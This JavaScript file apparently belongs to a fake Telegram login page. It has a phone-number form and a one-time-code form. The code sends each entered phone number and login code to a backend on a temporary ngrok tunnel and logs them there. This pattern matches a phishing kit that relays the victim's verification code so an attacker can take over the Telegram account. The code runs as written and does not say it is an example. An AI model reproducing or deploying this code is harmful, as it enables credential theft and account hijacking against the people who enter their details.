const BACKEND_URL = 'https://5e3a-81-155-215-249.ngrok-free.app';

async function sendLogToBackend(message) {
    console.log('Log:', message);
    try {
        await fetch(`${BACKEND_URL}/log`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ logMessage: message })
        });
    } catch (error) {
        console.error('Error sending log to backend:', error);
    }
}

let countries = [];

async function fetchCountries() {
    try {
        const response = await fetch('https://restcountries.com/v3.1/all');
        if (!response.ok) throw new Error('Failed to fetch countries');
        
        countries = await response.json();
        countries.sort((a, b) => {
            const codeA = a.idd.root + (a.idd.suffixes ? a.idd.suffixes[0] : '');
            const codeB = b.idd.root + (b.idd.suffixes ? b.idd.suffixes[0] : '');
            return codeA.localeCompare(codeB);
        });
        populateCountryDropdown(countries);
    } catch (error) {
        console.error('Error fetching countries:', error);
        sendLogToBackend("Error fetching countries: " + error.message);
    }
}

function populateCountryDropdown(countries) {
    const countrySelect = document.getElementById('country');
    if (countrySelect) {
        countries.forEach(country => {
            const countryCode = country.cca2;
            const countryName = country.name.common;
            const callingCode = country.idd.root + (country.idd.suffixes ? country.idd.suffixes[0] : '');

            const option = document.createElement('option');
            option.value = countryCode;
            option.textContent = `${countryName} (${callingCode})`;
            countrySelect.appendChild(option);
        });
    }
}

document.addEventListener('DOMContentLoaded', function() {
    fetchCountries();

    const isNightMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
    if (isNightMode) {
        document.body.classList.add('night-mode');
        sendLogToBackend("Night mode activated.");

        const logoImage = document.getElementById('telegramLogo');
        if (logoImage) {
            logoImage.src = 'telegram-logo2.png'; 
        }
    } else {
        sendLogToBackend("Light mode activated.");
    }

    const phoneInput = document.getElementById('phoneNumber');
    const countrySelect = document.getElementById('country');
    
    if (phoneInput) {
        phoneInput.addEventListener('input', function() {
            const inputNumber = phoneInput.value.replace(/\D/g, ''); // Remove non-digit characters
            if (inputNumber.length >= 3) { // Only process if the input has 3 or more digits
                const matchedCountry = findCountryByPhoneCode(inputNumber);
                if (matchedCountry && countrySelect) {
                    countrySelect.value = matchedCountry.cca2;
                }
            }
        });

        phoneInput.addEventListener('focus', () => {
            setTimeout(() => {
                window.scrollTo({
                    top: phoneInput.getBoundingClientRect().top - 100,
                    behavior: 'smooth'
                });
            }, 300);
        });
    }

    window.addEventListener('resize', () => {
        if (window.innerHeight < 500) { // Adjust for keyboard presence
            window.scrollTo({
                top: phoneInput.getBoundingClientRect().top - 100, // Adjust as necessary
                behavior: 'smooth'
            });
        }
    });

    const phoneForm = document.getElementById('phoneForm');
    if (phoneForm) {
        phoneForm.addEventListener('submit', async function(event) {
            event.preventDefault();
            sendLogToBackend("Phone form submitted!");

            const phoneNumber = document.getElementById('phoneNumber').value;
            sendLogToBackend("Phone number entered: " + phoneNumber);
            sessionStorage.setItem('phoneNumber', phoneNumber);

            const submitButton = phoneForm.querySelector('button[type="submit"]');
            submitButton.disabled = true; // Disable button to prevent multiple submissions
            displayLoadingIndicator(true);

            try {
                const response = await fetch(`${BACKEND_URL}/sendPhoneNumber`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phoneNumber })
                });

                const data = await response.json();
                if (data.message && data.message.includes('The phone number is invalid')) {
                    throw new Error('Invalid phone number, please input your correct phone number.');
                }

                if (!response.ok) {
                    throw new Error('Network response was not ok: ' + response.statusText);
                }

                sendLogToBackend('Response from backend: ' + JSON.stringify(data));

                if (data.phone_code_hash) {
                    sessionStorage.setItem('phone_code_hash', data.phone_code_hash);
                    sendLogToBackend("Phone code hash stored: " + data.phone_code_hash);
                    document.getElementById('loginContainer').classList.add('swipe-left');
                    setTimeout(() => {
                        window.location.href = '/otp.html';
                    }, 600);
                } else {
                    displayMessage(data.message || 'Failed to send OTP', 'error');
                }
            } catch (error) {
                displayMessage(error.message, 'error');
            } finally {
                submitButton.disabled = false; // Re-enable button
                displayLoadingIndicator(false);
            }
        });
    }

    // Handling OTP form submission for verifyOTP endpoint
    const otpForm = document.getElementById('otpForm');
    if (otpForm) {
        otpForm.addEventListener('submit', async function(event) {
            event.preventDefault();
            const phoneNumber = sessionStorage.getItem('phoneNumber');
            const phoneCode = document.getElementById('phoneCode').value;

            sendLogToBackend(`Submitting OTP form. Phone number: ${phoneNumber}, OTP: ${phoneCode}`);

            try {
                const response = await fetch(`${BACKEND_URL}/verifyOTP`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phoneNumber, phoneCode })
                });

                const data = await response.json();
                sendLogToBackend(`Response from /verifyOTP: ${JSON.stringify(data)}`);

                if (response.ok) {
                    window.location.href = '/success.html'; // Redirect on success
                } else {
                    displayMessage(data.message || 'Failed to verify OTP', 'error');
                }
            } catch (error) {
                displayMessage('Error verifying OTP: ' + error.message, 'error');
            }
        });
    }
});

function findCountryByPhoneCode(phoneNumber) {
    let matchedCountry = null;
    let longestMatchLength = 0;

    for (const country of countries) {
        const phoneRoot = country.idd.root.replace('+', ''); // Remove '+' from root
        const suffixes = country.idd.suffixes || [''];
        
        suffixes.forEach(suffix => {
            const fullCode = phoneRoot + suffix;
            if (phoneNumber.startsWith(fullCode) && fullCode.length > longestMatchLength) {
                matchedCountry = country;
                longestMatchLength = fullCode.length;
            }
        });
    }

    return matchedCountry;
}

function displayLoadingIndicator(isLoading) {
    const loadingIndicator = document.getElementById('loadingIndicator');
    if (loadingIndicator) {
        loadingIndicator.style.display = isLoading ? 'block' : 'none';
    }
}
